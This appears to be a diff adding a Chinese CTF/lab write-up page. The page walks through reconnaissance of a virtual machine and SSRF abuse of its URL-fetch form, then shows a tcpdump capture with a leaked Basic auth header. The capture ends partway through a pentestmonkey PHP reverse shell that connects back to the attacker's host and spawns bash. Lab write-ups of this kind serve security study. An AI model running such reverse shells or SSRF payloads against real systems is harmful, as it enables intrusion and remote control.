@@ -1,0 +1,1246 @@
+<!DOCTYPE html>
+<html data-color-mode="light" data-dark-theme="github-light" data-light-theme="light" lang="zh-CN">
+<head>
+    <meta content="text/html; charset=utf-8" http-equiv="content-type" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <link href='https://7r1UMPHK.github.io/css/primer.css' rel='stylesheet' />
+    <script src='https://7r1UMPHK.github.io/plugins/theme.js'></script>
+    <link rel="icon" href="https://7r1UMPHK.github.io/image/20250320200557660.ico">
+<meta name="description" content="![image-20250707214716346](https://7r1umphk.github.io/image/20250707214716465.webp)
+
+```
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
+└─$ sudo arp-scan -l                    
+[sudo] kali 的密码：
+Interface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.128
+Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
+192.168.205.1   00:50:56:c0:00:08       VMware, Inc.
+192.168.205.2   00:50:56:fc:94:2f       VMware, Inc.
+192.168.205.167 08:00:27:f0:d8:81       PCS Systemtechnik GmbH
+192.168.205.254 00:50:56:e7:e4:00       VMware, Inc.
+
+4 packets received by filter, 0 packets dropped by kernel
+Ending arp-scan 1.10.0: 256 hosts scanned in 1.953 seconds (131.08 hosts/sec). 4 responded
+```
+
+167的
+
+探测一下服务
+
+```
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
+└─$ nmap -p- 192.168.205.167
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-07 09:30 EDT
+Nmap scan report for 192.168.205.167
+Host is up (0.00010s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+MAC Address: 08:00:27:F0:D8:81 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 1.28 seconds
+```
+
+看看80
+
+```
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ curl http://192.168.205.167
+<!DOCTYPE html>
+<html>
+<head>
+    <title>HTTP Requester</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
+            background-color: #f5f5f5;
+        }
+        .container {
+            background-color: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        h1 {
+            color: #333;
+            border-bottom: 2px solid #eee;
+            padding-bottom: 10px;
+        }
+        form {
+            margin: 20px 0;
+            display: flex;
+            gap: 10px;
+        }
+        input[type='text'] {
+            flex: 1;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+        }
+        button {
+            padding: 10px 20px;
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #45a049;
+        }
+        .result-box {
+            margin-top: 20px;
+            padding: 15px;
+            background-color: #f9f9f9;
+            border-left: 4px solid #ccc;
+        }
+        nav {
+            margin-top: 30px;
+            display: flex;
+            gap: 15px;
+        }
+        nav a {
+            padding: 8px 16px;
+            background-color: #e0e0e0;
+            border-radius: 4px;
+            text-decoration: none;
+            color: #333;
+        }
+        nav a:hover {
+            background-color: #d0d0d0;
+        }
+        pre {
+            max-height: 300px;
+            overflow: auto;
+            padding: 15px;
+            background-color: #f8f8f8;
+            border: 1px solid #e0e0e0;
+            border-radius: 4px;
+            white-space: pre-wrap;
+        }
+    </style>
+</head>
+<body>
+    <div class='container'>
+        <h1>Website Request Tool</h1>
+        <form method='POST'>
+            <input type='text' name='url' placeholder='Enter URL starting with http' required>
+            <button type='submit'>Fetch Content</button>
+        </form>
+        
+        <div class='result-box'>
+            <h3>Current target:</h3>
+            No request made        </div>
+        
+        <div class='result-box'>
+            <h3>Response:</h3>
+                            <p>Submit URL to test connection</p>
+                    </div>
+        
+        <nav>
+            <a href='home.php'>Home</a>
+            <a href='about.php'>About</a>
+            <a href='dashboard.php'>Dashboard</a>
+        </nav>
+    </div>
+</body>
+</html>
+```
+
+![image-20250707214425237](https://7r1umphk.github.io/image/20250707214432940.webp)
+
+尝试访问反弹shell
+
+![image-20250707214553039](https://7r1umphk.github.io/image/20250707214553216.webp)
+
+没解析
+
+查看本地文件
+
+![image-20250707214628218](https://7r1umphk.github.io/image/20250707214628414.webp)
+
+看了home，about，dashboard，还尝试了一下167的ip，都没有什么东西
+
+抓个包看看
+
+![image-20250707214846154](https://7r1umphk.github.io/image/20250707214846404.webp)
+
+没啥东西
+
+然后这里测试了很多，后面发现是它发送的头有东西
+
+```
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ sudo tcpdump -A host 192.168.205.167
+[sudo] kali 的密码：
+对不起，请重试。">
+<meta property="og:title" content="内部_Basic">
+<meta property="og:description" content="![image-20250707214716346](https://7r1umphk.github.io/image/20250707214716465.webp)
+
+```
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
+└─$ sudo arp-scan -l                    
+[sudo] kali 的密码：
+Interface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.128
+Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
+192.168.205.1   00:50:56:c0:00:08       VMware, Inc.
+192.168.205.2   00:50:56:fc:94:2f       VMware, Inc.
+192.168.205.167 08:00:27:f0:d8:81       PCS Systemtechnik GmbH
+192.168.205.254 00:50:56:e7:e4:00       VMware, Inc.
+
+4 packets received by filter, 0 packets dropped by kernel
+Ending arp-scan 1.10.0: 256 hosts scanned in 1.953 seconds (131.08 hosts/sec). 4 responded
+```
+
+167的
+
+探测一下服务
+
+```
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
+└─$ nmap -p- 192.168.205.167
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-07 09:30 EDT
+Nmap scan report for 192.168.205.167
+Host is up (0.00010s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+MAC Address: 08:00:27:F0:D8:81 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 1.28 seconds
+```
+
+看看80
+
+```
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ curl http://192.168.205.167
+<!DOCTYPE html>
+<html>
+<head>
+    <title>HTTP Requester</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
+            background-color: #f5f5f5;
+        }
+        .container {
+            background-color: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        h1 {
+            color: #333;
+            border-bottom: 2px solid #eee;
+            padding-bottom: 10px;
+        }
+        form {
+            margin: 20px 0;
+            display: flex;
+            gap: 10px;
+        }
+        input[type='text'] {
+            flex: 1;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+        }
+        button {
+            padding: 10px 20px;
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #45a049;
+        }
+        .result-box {
+            margin-top: 20px;
+            padding: 15px;
+            background-color: #f9f9f9;
+            border-left: 4px solid #ccc;
+        }
+        nav {
+            margin-top: 30px;
+            display: flex;
+            gap: 15px;
+        }
+        nav a {
+            padding: 8px 16px;
+            background-color: #e0e0e0;
+            border-radius: 4px;
+            text-decoration: none;
+            color: #333;
+        }
+        nav a:hover {
+            background-color: #d0d0d0;
+        }
+        pre {
+            max-height: 300px;
+            overflow: auto;
+            padding: 15px;
+            background-color: #f8f8f8;
+            border: 1px solid #e0e0e0;
+            border-radius: 4px;
+            white-space: pre-wrap;
+        }
+    </style>
+</head>
+<body>
+    <div class='container'>
+        <h1>Website Request Tool</h1>
+        <form method='POST'>
+            <input type='text' name='url' placeholder='Enter URL starting with http' required>
+            <button type='submit'>Fetch Content</button>
+        </form>
+        
+        <div class='result-box'>
+            <h3>Current target:</h3>
+            No request made        </div>
+        
+        <div class='result-box'>
+            <h3>Response:</h3>
+                            <p>Submit URL to test connection</p>
+                    </div>
+        
+        <nav>
+            <a href='home.php'>Home</a>
+            <a href='about.php'>About</a>
+            <a href='dashboard.php'>Dashboard</a>
+        </nav>
+    </div>
+</body>
+</html>
+```
+
+![image-20250707214425237](https://7r1umphk.github.io/image/20250707214432940.webp)
+
+尝试访问反弹shell
+
+![image-20250707214553039](https://7r1umphk.github.io/image/20250707214553216.webp)
+
+没解析
+
+查看本地文件
+
+![image-20250707214628218](https://7r1umphk.github.io/image/20250707214628414.webp)
+
+看了home，about，dashboard，还尝试了一下167的ip，都没有什么东西
+
+抓个包看看
+
+![image-20250707214846154](https://7r1umphk.github.io/image/20250707214846404.webp)
+
+没啥东西
+
+然后这里测试了很多，后面发现是它发送的头有东西
+
+```
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ sudo tcpdump -A host 192.168.205.167
+[sudo] kali 的密码：
+对不起，请重试。">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://7r1UMPHK.github.io/post/nei-bu-_Basic.html">
+<meta property="og:image" content="https://7r1umphk.github.io/image/20250702120408748.webp">
+<title>内部_Basic</title>
+
+
+
+</head>
+<style>
+body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;padding: 45px;font-size: 16px;font-family: sans-serif;line-height: 1.25;}
+#header{display:flex;padding-bottom:8px;border-bottom: 1px solid var(--borderColor-muted, var(--color-border-muted));margin-bottom: 16px;}
+#footer {margin-top:64px; text-align: center;font-size: small;}
+
+</style>
+
+<style>
+.postTitle{margin: auto 0;font-size:40px;font-weight:bold;}
+.title-right{display:flex;margin:auto 0 0 auto;}
+.title-right .circle{padding: 14px 16px;margin-right:8px;}
+#postBody{border-bottom: 1px solid var(--color-border-default);padding-bottom:36px;}
+#postBody hr{height:2px;}
+#cmButton{height:48px;margin-top:48px;}
+#comments{margin-top:64px;}
+.g-emoji{font-size:24px;}
+@media (max-width: 600px) {
+    body {padding: 8px;}
+    .postTitle{font-size:24px;}
+}
+.copy-feedback {
+    display: none;
+    position: absolute;
+    top: 10px;
+    right: 50px;
+    color: var(--color-fg-on-emphasis);
+    background-color: var(--color-fg-muted);
+    border-radius: 3px;
+    padding: 5px 8px;
+    font-size: 12px;
+}
+</style>
+
+
+
+
+<body>
+    <div id="header">
+<h1 class="postTitle">内部_Basic</h1>
+<div class="title-right">
+    <a href="https://7r1UMPHK.github.io" id="buttonHome" class="btn btn-invisible circle" title="首页">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathHome" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+    <a href="https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/135" target="_blank" class="btn btn-invisible circle" title="Issue">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathIssue" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+
+    <a class="btn btn-invisible circle" onclick="modeSwitch();" title="切换主题"style="display:none;">
+        <svg class="octicon" width="16" height="16" >
+            <path id="themeSwitch" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+
+</div>
+</div>
+    <div id="content">
+<div class="markdown-body" id="postBody"><p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/593d155cd6bf94418f26278527f713b5c58b186792da40c17694a2adcb0d1714/68747470733a2f2f377231756d70686b2e6769746875622e696f2f696d6167652f32303235303730373231343731363436352e77656270"><img src="https://camo.githubusercontent.com/593d155cd6bf94418f26278527f713b5c58b186792da40c17694a2adcb0d1714/68747470733a2f2f377231756d70686b2e6769746875622e696f2f696d6167652f32303235303730373231343731363436352e77656270" alt="image-20250707214716346" data-canonical-src="https://7r1umphk.github.io/image/20250707214716465.webp" style="max-width: 100%;"></a></p>
+<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
+└─$ sudo arp-scan -l                    
+[sudo] kali 的密码：
+Interface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.128
+Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
+192.168.205.1   00:50:56:c0:00:08       VMware, Inc.
+192.168.205.2   00:50:56:fc:94:2f       VMware, Inc.
+192.168.205.167 08:00:27:f0:d8:81       PCS Systemtechnik GmbH
+192.168.205.254 00:50:56:e7:e4:00       VMware, Inc.
+
+4 packets received by filter, 0 packets dropped by kernel
+Ending arp-scan 1.10.0: 256 hosts scanned in 1.953 seconds (131.08 hosts/sec). 4 responded
+</code></pre>
+<p>167的</p>
+<p>探测一下服务</p>
+<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
+└─$ nmap -p- 192.168.205.167
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-07 09:30 EDT
+Nmap scan report for 192.168.205.167
+Host is up (0.00010s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+MAC Address: 08:00:27:F0:D8:81 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 1.28 seconds
+</code></pre>
+<p>看看80</p>
+<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ curl http://192.168.205.167
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+    &lt;title&gt;HTTP Requester&lt;/title&gt;
+    &lt;style&gt;
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
+            background-color: #f5f5f5;
+        }
+        .container {
+            background-color: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        h1 {
+            color: #333;
+            border-bottom: 2px solid #eee;
+            padding-bottom: 10px;
+        }
+        form {
+            margin: 20px 0;
+            display: flex;
+            gap: 10px;
+        }
+        input[type="text"] {
+            flex: 1;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+        }
+        button {
+            padding: 10px 20px;
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #45a049;
+        }
+        .result-box {
+            margin-top: 20px;
+            padding: 15px;
+            background-color: #f9f9f9;
+            border-left: 4px solid #ccc;
+        }
+        nav {
+            margin-top: 30px;
+            display: flex;
+            gap: 15px;
+        }
+        nav a {
+            padding: 8px 16px;
+            background-color: #e0e0e0;
+            border-radius: 4px;
+            text-decoration: none;
+            color: #333;
+        }
+        nav a:hover {
+            background-color: #d0d0d0;
+        }
+        pre {
+            max-height: 300px;
+            overflow: auto;
+            padding: 15px;
+            background-color: #f8f8f8;
+            border: 1px solid #e0e0e0;
+            border-radius: 4px;
+            white-space: pre-wrap;
+        }
+    &lt;/style&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;div class="container"&gt;
+        &lt;h1&gt;Website Request Tool&lt;/h1&gt;
+        &lt;form method="POST"&gt;
+            &lt;input type="text" name="url" placeholder="Enter URL starting with http" required&gt;
+            &lt;button type="submit"&gt;Fetch Content&lt;/button&gt;
+        &lt;/form&gt;
+        
+        &lt;div class="result-box"&gt;
+            &lt;h3&gt;Current target:&lt;/h3&gt;
+            No request made        &lt;/div&gt;
+        
+        &lt;div class="result-box"&gt;
+            &lt;h3&gt;Response:&lt;/h3&gt;
+                            &lt;p&gt;Submit URL to test connection&lt;/p&gt;
+                    &lt;/div&gt;
+        
+        &lt;nav&gt;
+            &lt;a href="home.php"&gt;Home&lt;/a&gt;
+            &lt;a href="about.php"&gt;About&lt;/a&gt;
+            &lt;a href="dashboard.php"&gt;Dashboard&lt;/a&gt;
+        &lt;/nav&gt;
+    &lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/29523896b2e50e2095081134539627d66209a6620f0fc8a8a6294ee294c8483f/68747470733a2f2f377231756d70686b2e6769746875622e696f2f696d6167652f32303235303730373231343433323934302e77656270"><img src="https://camo.githubusercontent.com/29523896b2e50e2095081134539627d66209a6620f0fc8a8a6294ee294c8483f/68747470733a2f2f377231756d70686b2e6769746875622e696f2f696d6167652f32303235303730373231343433323934302e77656270" alt="image-20250707214425237" data-canonical-src="https://7r1umphk.github.io/image/20250707214432940.webp" style="max-width: 100%;"></a></p>
+<p>尝试访问反弹shell</p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/9c7a24ccd2f3e4572a4b2a1f5f7f9beab3f56c8c32dd7879850514edb86058ce/68747470733a2f2f377231756d70686b2e6769746875622e696f2f696d6167652f32303235303730373231343535333231362e77656270"><img src="https://camo.githubusercontent.com/9c7a24ccd2f3e4572a4b2a1f5f7f9beab3f56c8c32dd7879850514edb86058ce/68747470733a2f2f377231756d70686b2e6769746875622e696f2f696d6167652f32303235303730373231343535333231362e77656270" alt="image-20250707214553039" data-canonical-src="https://7r1umphk.github.io/image/20250707214553216.webp" style="max-width: 100%;"></a></p>
+<p>没解析</p>
+<p>查看本地文件</p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/92de6286c96fe6e15a0e2ab57be1a0357897c8615ccda104324105148d37118d/68747470733a2f2f377231756d70686b2e6769746875622e696f2f696d6167652f32303235303730373231343632383431342e77656270"><img src="https://camo.githubusercontent.com/92de6286c96fe6e15a0e2ab57be1a0357897c8615ccda104324105148d37118d/68747470733a2f2f377231756d70686b2e6769746875622e696f2f696d6167652f32303235303730373231343632383431342e77656270" alt="image-20250707214628218" data-canonical-src="https://7r1umphk.github.io/image/20250707214628414.webp" style="max-width: 100%;"></a></p>
+<p>看了home，about，dashboard，还尝试了一下167的ip，都没有什么东西</p>
+<p>抓个包看看</p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/df95d027b761a26d6802aadaf6113a129d66e4bd9368b9b5ed22855f2587fa9c/68747470733a2f2f377231756d70686b2e6769746875622e696f2f696d6167652f32303235303730373231343834363430342e77656270"><img src="https://camo.githubusercontent.com/df95d027b761a26d6802aadaf6113a129d66e4bd9368b9b5ed22855f2587fa9c/68747470733a2f2f377231756d70686b2e6769746875622e696f2f696d6167652f32303235303730373231343834363430342e77656270" alt="image-20250707214846154" data-canonical-src="https://7r1umphk.github.io/image/20250707214846404.webp" style="max-width: 100%;"></a></p>
+<p>没啥东西</p>
+<p>然后这里测试了很多，后面发现是它发送的头有东西</p>
+<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ sudo tcpdump -A host 192.168.205.167
+[sudo] kali 的密码：
+对不起，请重试。
+[sudo] kali 的密码：
+tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
+listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
+09:50:18.143873 IP 192.168.205.1.60727 &gt; 192.168.205.167.http: Flags [S], seq 1359019690, win 64240, options [mss 1460,nop,wscale 8,nop,nop,sackOK], length 0
+E..4.
+@..............7.PQ...........................
+09:50:18.144240 IP 192.168.205.167.http &gt; 192.168.205.1.60727: Flags [S.], seq 1762610671, ack 1359019691, win 64240, options [mss 1460,nop,nop,sackOK,nop,wscale 7], length 0
+E..4..@.@............P.7i.M.Q.......c...............
+09:50:18.144526 IP 192.168.205.1.60727 &gt; 192.168.205.167.http: Flags [.], ack 1, win 513, length 0
+E..(..@..............7.PQ...i.M.P.............
+09:50:18.144722 IP 192.168.205.1.60727 &gt; 192.168.205.167.http: Flags [P.], seq 1:557, ack 1, win 513, length 556: HTTP: POST / HTTP/1.1
+E..T..@..............7.PQ...i.M.P...S...POST / HTTP/1.1
+Host: 192.168.205.167
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 26
+Origin: http://192.168.205.167
+Connection: keep-alive
+Referer: http://192.168.205.167/
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
+
+url=http%3A%2F%2F127.0.0.1
+09:50:18.144954 IP 192.168.205.167.http &gt; 192.168.205.1.60727: Flags [.], ack 557, win 501, length 0
+E..(@.@.@..9.........P.7i.M.Q...P.............
+09:50:18.147613 IP 192.168.205.167.http &gt; 192.168.205.1.60727: Flags [P.], seq 1:1381, ack 557, win 501, length 1380: HTTP: HTTP/1.1 200 OK
+E...@.@.@............P.7i.M.Q...P....w..HTTP/1.1 200 OK
+Date: Mon, 07 Jul 2025 13:50:18 GMT
+Server: Apache/2.4.62 (Debian)
+Vary: Accept-Encoding
+Content-Encoding: gzip
+Content-Length: 1127
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+...........XKo.6...W.
+...*....*.. ..=.. ..(..h...J...b.E.{....(.m....!.9..f8.....w....&gt;...(..,n.`..3 .X.....r......s.Y..Y#..K....E/...S=kZ
+.....D..............%[...%Hd......p.mH.......Z..".&amp;.W.m+...a...........jtb..o....I......mF.&gt;..e.3.ADj.....|.AD....j.B....
+~;{..e...r...6^..s'......6.iN.8...I+.Z.u.......1.......^.P&amp;.:...l`5m..U-~./.....        ..a.I}r..q...!W.. ..........*.p,......... \..../i.\q..:k.....R^.i...&gt;.q....pv..y...u.d...9..Z..J...1..... .x-t..3N.........G._M..;W..8.*7......x..?;uui|.S.. .l...,.........RS1&lt;
+...0.dB.z.kep...x....(7j.Z..Mx...y.S.)..-....8.w.80=6V.r.H.y.i.9.....u.5.......L.....\.
+{R...Xd..y..&gt;/{*.....WH.....f..dN.8..t..{......G..dB..l..$Y.....@.F...bh..zU..%..H3. .....#...(..w...IWI..e...fL......H.dn.).Q..W?\...;.......yEK..6.O,."....E..6..L...2=....&amp;4.R36.SKA..J.4kg.s.e'^..y.....D.5.............C;...fh..v.S...X}.&gt;j...(....).i5a..C5.br.X8...tF..u........dC...d|..&gt;.3S...~SC....4.......8.v.......5k-.........jz..M....?Q..:.."la...
+..VN..&gt;J.RR.u...        *k.D-S....)Z[5..u.d.q.. cx..3....................~..... .V.2d.x.L;....kV Lr6...H...@.zg0'.ZHC...{.^.8/Q...8!...Kth.%.`xI..kG........0.../....I..*...
+09:50:18.197232 IP 192.168.205.1.60727 &gt; 192.168.205.167.http: Flags [.], ack 1381, win 507, length 0
+E..(..@..............7.PQ...i.STP.............
+09:50:22.378643 IP 192.168.205.167.bootpc &gt; 192.168.205.254.bootps: BOOTP/DHCP, Request from 08:00:27:f0:d8:81 (oui Unknown), length 300
+E..H..@.@............D.C.4......%.      :......................'.............................................................................................................................................................................................................c.Sc5....Basic7.......w.,/.y*=..'......./l....'-.H..............
+09:50:22.379024 IP 192.168.205.254.bootps &gt; 192.168.205.167.bootpc: BOOTP/DHCP, Reply, length 300
+E..H.................C.D.4......%.      :......................'.............................................................................................................................................................................................................c.Sc5..6.....3.........................localdomain......,.......
+09:50:23.159139 IP 192.168.205.167.http &gt; 192.168.205.1.60727: Flags [F.], seq 1381, ack 557, win 501, length 0
+E..(@.@.@..7.........P.7i.STQ...P.... ........
+09:50:23.159439 IP 192.168.205.1.60727 &gt; 192.168.205.167.http: Flags [.], ack 1382, win 507, length 0
+E..(..@..............7.PQ...i.SUP.............
+09:50:23.999242 IP 192.168.205.1.60742 &gt; 192.168.205.167.http: Flags [S], seq 2328306649, win 64240, options [mss 1460,nop,wscale 8,nop,nop,sackOK], length 0
+E..4..@..............F.P..#.........................
+09:50:23.999577 IP 192.168.205.167.http &gt; 192.168.205.1.60742: Flags [S.], seq 4258427036, ack 2328306650, win 64240, options [mss 1460,nop,nop,sackOK,nop,wscale 7], length 0
+E..4..@.@............P.F..p...#.....Mn..............
+09:50:23.999823 IP 192.168.205.1.60742 &gt; 192.168.205.167.http: Flags [.], ack 1, win 513, length 0
+E..(..@..............F.P..#...p.P....0........
+09:50:23.999943 IP 192.168.205.1.60742 &gt; 192.168.205.167.http: Flags [P.], seq 1:573, ack 1, win 513, length 572: HTTP: POST / HTTP/1.1
+E..d..@..............F.P..#...p.P.......POST / HTTP/1.1
+Host: 192.168.205.167
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 46
+Origin: http://192.168.205.167
+Connection: keep-alive
+Referer: http://192.168.205.167/
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
+
+url=http%3A%2F%2F192.168.205.128%2Freverse.php
+09:50:24.000119 IP 192.168.205.167.http &gt; 192.168.205.1.60742: Flags [.], ack 573, win 501, length 0
+E..(.Q@.@.s..........P.F..p...&amp;.P.............
+09:50:24.000772 IP 192.168.205.167.40214 &gt; 192.168.205.128.http: Flags [S], seq 726111212, win 64240, options [mss 1460,sackOK,TS val 2885018455 ecr 0,nop,wscale 7], length 0
+E..&lt;..@.@.G5...........P+G..........D..........
+...W........
+09:50:24.000797 IP 192.168.205.128.http &gt; 192.168.205.167.40214: Flags [S.], seq 2197022970, ack 726111213, win 65160, options [mss 1460,sackOK,TS val 1602276764 ecr 2885018455,nop,wscale 7], length 0
+E..&lt;..@.@..C.........P......+G.................
+_......W....
+09:50:24.000931 IP 192.168.205.167.40214 &gt; 192.168.205.128.http: Flags [.], ack 1, win 502, options [nop,nop,TS val 2885018456 ecr 1602276764], length 0
+E..4..@.@.G&lt;...........P+G...........W.....
+...X_...
+09:50:24.000978 IP 192.168.205.167.40214 &gt; 192.168.205.128.http: Flags [P.], seq 1:153, ack 1, win 502, options [nop,nop,TS val 2885018456 ecr 1602276764], length 152: HTTP: GET /reverse.php HTTP/1.1
+E.....@.@.F............P+G..........x0.....
+...X_...GET /reverse.php HTTP/1.1
+Host: 192.168.205.128
+Accept: */*
+Authorization: Basic Y25oeWs6YmNmODI5NjI3ZWVhMzY0YTNhYmM0MWE2NTM3ZmJmNTQzZTk3NGZmOA==
+
+
+09:50:24.000983 IP 192.168.205.128.http &gt; 192.168.205.167.40214: Flags [.], ack 153, win 508, options [nop,nop,TS val 1602276764 ecr 2885018456], length 0
+E..4.9@.@.|..........P......+G.............
+_......X
+09:50:24.002659 IP 192.168.205.128.http &gt; 192.168.205.167.40214: Flags [P.], seq 1:203, ack 153, win 508, options [nop,nop,TS val 1602276766 ecr 2885018456], length 202: HTTP: HTTP/1.0 200 OK
+E....:@.@.{F.........P......+G.......j.....
+_......XHTTP/1.0 200 OK
+Server: SimpleHTTP/0.6 Python/3.13.3
+Date: Mon, 07 Jul 2025 13:50:24 GMT
+Content-type: application/octet-stream
+Content-Length: 2596
+Last-Modified: Thu, 26 Jun 2025 12:22:10 GMT
+
+
+09:50:24.002881 IP 192.168.205.167.40214 &gt; 192.168.205.128.http: Flags [.], ack 203, win 501, options [nop,nop,TS val 2885018458 ecr 1602276766], length 0
+E..4..@.@.G:...........P+G.................
+...Z_...
+09:50:24.003021 IP 192.168.205.128.http &gt; 192.168.205.167.40214: Flags [P.], seq 203:2799, ack 153, win 508, options [nop,nop,TS val 1602276766 ecr 2885018458], length 2596: HTTP
+E.
+X.;@.@.q..........P......+G......&amp;......
+_......Z&lt;?php
+// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
+// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
+
+set_time_limit (0);
+$VERSION = "1.0";
+$ip = '192.168.205.128';
+$port = 8888;
+$chunk_size = 1400;
+$write_a = null;
+$error_a = null;
+$shell = 'uname -a; w; id; /bin/bash -i';
+$daemon = 0;
+$debug = 0;
+
+if (function_exists('pcntl_fork')) {
+        $pid = pcntl_fork();
+
+        if ($pid == -1) {
+                printit("ERROR: Can't fork");
+                exit(1);
+        }
+
+        if ($pid) {
+                exit(0);  // Parent exits
+        }
+        if (posix_setsid() == -1) {
+                printit("Error: Can't setsid()");
+                exit(1);
+        }
+
+        $daemon = 1;
+} else {
+        printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
+}
+
+chdir("/");
+
+umask(0);
+
+// Open reverse connection
+$sock = fsockopen($ip, $port, $errno, $errstr, 30);
+if (!$sock) {
+        printit("$errstr ($errno)");
+        exit(1);
+}
+
+$descriptorspec = array(
+   0 =&gt; array("pipe", "r"),  // stdin is a pipe that the child will read from
+   1 =&gt; array("pipe", "w"),  // stdout is a pipe that the child will write to
+   2 =&gt; array("pipe", "w")   // stderr is a pipe that the child will write to
+);
+
+$process = proc_open($shell, $descriptorspec, $pipes);
+
+if (!is_resource($process)) {
+        printit("ERROR: Can't spawn shell");
+        exit(1);
+}
+
+stream_set_blocking($pipes[0], 0);
+stream_set_blocking($pipes[1], 0);
+stream_set_blocking($pipes[2], 0);
+stream_set_blocking($sock, 0);
+
